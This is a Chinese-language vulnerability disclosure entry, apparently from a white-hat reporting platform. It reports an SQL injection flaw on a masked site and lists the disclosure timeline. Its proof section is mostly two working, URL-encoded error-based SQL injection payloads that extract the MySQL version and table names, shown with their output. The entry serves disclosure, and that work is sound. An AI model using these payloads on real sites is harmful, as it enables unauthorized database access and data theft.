漏洞详情 披露状态：   									2015-12-03：	细节已通知厂商并且等待厂商处理中									2015-12-06：	厂商已经确认，细节仅向厂商公开									2015-12-16：	细节向核心白帽子及相关领域专家公开									2015-12-26：	细节向普通白帽子公开									2016-01-05：	细节向实习白帽子公开									2016-01-20：	细节向公众公开  简要描述： 該站存在入~ 详细说明：  該站存在入~   漏洞证明：  http://**.**.**.**/page03.php?sel_class=8+and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20%28select%20concat%280x7e,version%28%29,0x7e%29%29%29%20from%20information_schema.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29DB Version:5.0.77存在表 aboutushttp://**.**.**.**/page03.php?sel_class=8+and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20%28SELECT%20distinct%20concat%280x7e,table_name,0x7e%29%20FROM%20information_schema.tables%20where%20table_schema=database%28%29%20LIMIT%200,1%29%29%20from%20information_schema.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29
